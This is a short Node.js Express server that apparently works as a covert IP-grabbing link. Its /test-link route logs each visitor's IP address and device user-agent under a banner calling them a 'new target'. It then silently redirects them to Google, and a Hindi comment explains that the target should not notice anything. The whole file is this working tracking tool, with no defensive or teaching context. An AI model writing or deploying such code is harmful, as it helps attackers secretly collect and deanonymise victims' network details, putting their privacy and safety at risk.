const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.get('/test-link', (req, res) => {
    const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userDevice = req.headers['user-agent'];

    console.log(`\n============== NAYA TARGET AAYA ==============`);
    console.log(`[+] IP Address: ${userIP}`);
    console.log(`[+] Device Info: ${userDevice}`);
    console.log(`==============================================\n`);

    // Target ko galti ka ehsaas dilaye bina Google par bhej dein
    res.redirect('https://www.google.com');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
